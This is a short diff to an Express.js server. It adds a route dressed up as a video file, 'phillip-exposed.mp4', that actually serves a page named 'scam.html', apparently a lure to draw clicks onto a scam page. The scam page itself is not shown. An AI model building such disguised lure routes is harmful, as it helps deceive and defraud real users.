@@ -19,6 +19,11 @@ app.get('/', function(req, res){
     `);
 });
 
+app.get('/vidupload/videos/phillip-exposed.mp4' , (req, res) =>{
+    res.sendFile('scam.html', root)
+});
+
+
 //get /xhrs?u=url
 app.get('/xhr', function(req, res){
 var rt = setTimeout(function(){
